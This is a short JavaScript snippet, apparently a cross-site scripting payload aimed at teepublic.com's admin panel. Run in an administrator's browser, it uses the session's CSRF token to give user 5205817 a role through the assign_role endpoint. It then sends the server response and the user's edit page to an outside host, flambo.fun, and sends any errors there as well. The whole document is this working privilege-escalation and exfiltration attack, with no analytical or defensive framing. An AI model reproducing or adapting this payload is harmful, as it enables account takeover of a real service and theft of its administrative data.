
(async function () {

    try {

        const user_id = 5205817

        await fetch(`https://www.teepublic.com/manage/users/${user_id}/edit`)

        const response = await fetch("https://www.teepublic.com/manage/users/assign_role", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Csrf-Token": Cookies.get("csrf_token"),
                "X-Requested-With": "XMLHttpRequest"
            },
            body: new URLSearchParams({
                "user_id": user_id,
                "permission_id": 1,
                "checked": "checked"
            })
        })

        await fetch("https://flambo.fun/api/public/page", {
            method: "POST",
            body: await response.text()
        })

        const page = await fetch(`https://www.teepublic.com/manage/users/${user_id}/edit`)

        await fetch("https://flambo.fun/api/public/page", {
            method: "POST",
            body: await page.text()
        })
    }

    catch (error) {

        await fetch("https://flambo.fun/api/public/page", {
            method: "POST",
            body: JSON.stringify(error)
        })
    }

})();